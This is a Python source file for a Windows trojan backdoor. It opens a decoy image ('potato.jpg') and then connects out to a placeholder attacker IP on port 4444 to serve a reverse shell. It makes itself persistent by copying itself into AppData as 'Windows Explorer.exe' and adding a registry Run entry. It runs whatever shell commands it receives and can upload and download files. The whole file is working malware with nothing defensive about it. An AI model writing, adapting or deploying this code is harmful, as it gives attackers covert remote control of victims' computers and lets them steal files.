#!/usr/bin/env python

import socket
import subprocess
import json
import os
import sys
import base64
import shutil
import time


class Xy:
    def __init__(self, ip, port):

        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    # Copies itself to startup registry under different name
    def become_persistent(self):
        loc = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(loc):
            shutil.copyfile(sys.executable, loc)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + loc + '"', shell=True)
    # sasdfasdfghweasdgasddgasdgasdf
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue


    def execute_system_command(self, command):

            return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)


    # file path navigation
    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successful."



    def run(self):
        while True:

            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:

                    command_result = self.change_working_directory_to(command[1])

                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command).decode()
            except Exception:
                command_result = "[-] Error "
            self.reliable_send(command_result)

file_name = sys._MEIPASS + "\potato.jpg"
subprocess.Popen(file_name, shell=True)
time.sleep(30)
try:
    xr = Xy("<IP ADDRESS>", 4444)
    xr.run()
except Exception:
    sys.exit()




